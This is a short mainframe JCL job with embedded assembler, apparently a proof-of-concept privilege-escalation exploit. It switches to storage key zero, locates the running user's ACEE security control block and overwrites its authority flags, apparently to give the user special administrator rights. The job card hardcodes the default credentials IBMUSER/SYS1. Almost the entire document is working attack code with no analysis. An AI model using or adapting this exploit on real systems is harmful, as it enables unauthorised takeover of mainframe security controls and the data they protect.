//ACEEJOB   JOB (TSO),
//             'COMP ACEEJOB',
//             CLASS=A,
//             MSGCLASS=A,
//             MSGLEVEL=(2,1),
//             REGION=0K,
//             USER=IBMUSER,
//             PASSWORD=SYS1
//ASMLKD1 EXEC ASMFCL,
//             PARM.ASM='OBJECT,NODECK,TERM,XREF(SHORT)',
//             PARM.LKED='LET,MAP,XREF,LIST,TEST,AC=1'
//ASM.SYSLIB  DD   DSN=SYS1.MACLIB,DISP=SHR
//            DD   DSN=SYS2.MACLIB,DISP=SHR
//            DD   DSN=SYS1.AMODGEN,DISP=SHR
//            DD   DSN=SYS1.AMACLIB,DISP=SHR
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSTERM DD SYSOUT=*
//ASM.SYSIN   DD *,DLM=@@
ACEEJOB  CSECT
*
* PREFIX TO SIMULATE R14 RETURN
*
         LR    R14,R15
         LA    R14,16(R14)
         BC    15,0(,R14)
         NOPR  0
EYE4     DC    XL4'CAFEBABE'
         USING *,R12
*
* ENTER KEY ZERO
*   
COPY     LR    R12,R14
         LA    R1,MSGKEY0
         SVC   35
         LA    R1,60
* MODESET KEY=ZERO,MODE=SUP
         SVC   107
*
* LOAD ACEE
*       
         LA    R1,MSGLACEE
         SVC   35
         L R5,X'224'            POINTER TO ASCB
         L R5,X'6C'(R5)         POINTER TO ASXB
         L R5,X'C8'(R5)         POINTER TO ACEE   
*
* WRITE ACEE
*       
         LA    R1,MSGWACEE
         SVC   35
         NI X'26'(R5),X'00'
         OI X'26'(R5),X'B1' 
*
* EXIT
*           
         LA    R1,MSGCOMPL
         SVC   35  
         SVC   03
MSGKEY0  DC XL4'00140000'
         DC C'GETTING KEY ZER0'
MSGLACEE DC XL4'00100000'
         DC C'LOADING ACEE'
MSGWACEE DC XL4'00100000'
         DC C'WRITING ACEE'
MSGCOMPL DC XL4'00140000'
         DC C'WRITING COMPLETE'
EYE1     DC    XL4'DEADBEEF'
*
* Register EQUates
*
R0       EQU   0
R1       EQU   1
R2       EQU   2
R3       EQU   3
R4       EQU   4
R5       EQU   5
R6       EQU   6
R7       EQU   7
R8       EQU   8
R9       EQU   9
R10      EQU   10
R11      EQU   11
R12      EQU   12
R13      EQU   13
R14      EQU   14
R15      EQU   15
         END
@@
//LKED.SYSLMOD  DD DSN=SYS2.LINKLIB(ACEEJOB),DISP=SHR
//LKED.SYSPRINT DD   SYSOUT=A
//ACEEJOB  EXEC PGM=ACEEJOB
//SYSPRINT DD   SYSOUT=A
//STEPLIB  DD   DISP=SHR,DSN=SYS2.LINKLIB
//SYSUDUMP DD   SYSOUT=A